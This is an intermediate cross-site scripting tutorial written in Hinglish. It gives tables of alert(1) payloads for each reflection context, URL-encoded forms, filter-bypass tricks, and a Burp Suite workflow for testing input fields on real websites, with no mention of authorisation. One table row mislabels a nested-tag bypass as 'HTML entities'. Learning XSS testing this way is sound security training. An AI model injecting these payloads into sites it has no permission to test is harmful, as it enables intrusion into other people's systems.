# XSS Intermediate Level
Yahan se tu seekhega:

- Different XSS contexts kya hote hain
- Encoded payloads kahan use karne hain
- Bypass techniques kya hoti hain
- Real websites jese input fields mein XSS kaise test karte hain
- BurpSuite mein XSS detection kaise hota hai

---

### ✅ Step 1: XSS Contexts — Kahan kaunsa payload use hota hai?

| 🔍 Context         | Reflection jahan hoti hai       | Example Payload             |
| ------------------ | ------------------------------- | --------------------------- |
| HTML Context       | `<div>input_here</div>`         | `<script>alert(1)</script>` |
| Attribute Context  | `<img src="input_here">`        | `x" onerror="alert(1)`      |
| JavaScript Context | `var a = "input_here"`          | `";alert(1);//`             |
| URL Context        | `<a href="input_here">`         | `javascript:alert(1)`       |
| Event Handler      | `<button onclick="input_here">` | `alert(1)`                  |

---

### Step 2: Encoding — Jab tag block ho to encoding se kaam chalate hain

| Payload                 | Encoded                         |
| ----------------------- | ------------------------------- |
| `<script>`              | `%3Cscript%3E`                  |
| `"`                     | `%22`                           |
| `'`                     | `%27`                           |
| `<svg onload=alert(1)>` | `%3Csvg%20onload%3Dalert(1)%3E` |

---

### Step 3: XSS Bypass Techniques


| Technique                                 | Example                                                           |
| ----------------------------------------- | ----------------------------------------------------------------- |
| Using HTML entities                       | `<scr<script>ipt>alert(1)</scr<script>ipt>`                       |
| Breaking out of attributes                | `x" onmouseover="alert(1)`                                        |
| Using different tags                      | `<svg/onload=alert(1)>`, `<math><mi//xlink:href="data:x"></math>` |
| Using backticks (template literals) in JS | `` `alert(1)` ``                                                  |

---

### Step 4: BurpSuite se XSS find karna (Manual way)

- Intercept on karo
- Target site pr search box ya input fill karo
- Request intercept ho jaaye to Repeater mein bhejo

Payload try karo (e.g., ```<script>alert(1)</script>```, then encoded version)

Response tab mein dekho payload reflect ho raha ya encode ho gaya

Agar reflect ho raha hai — payload tweak karo until alert aaye!

---

### ✅ Step 5: Real-World Website Example XSS Testing Strategy
Website open karo (example: search bar page)

Type: test123

Inspect element karo:

Dekho test123 kahan gaya? HTML, Attribute, ya JS?

Wahan pe match karta payload try karo

Response source (Ctrl+U) bhi check karo — burp bhi use karo

---

### 🧠 Real-World Tip:
"Har website mein XSS tabhi milta hai jab input → output flow directly ho
Aur developer usko properly sanitize/escape na kare."

🔚 Tera Level 2 Done Jab Tu Ye Kar Le:
✅ Tu context samajh jaaye
✅ Tu decide kar sake ke kaunsa payload kahan chalayega
✅ Tu BurpSuite mein XSS detect kar sake
✅ Tu bypass try kar sake jab normal script block ho

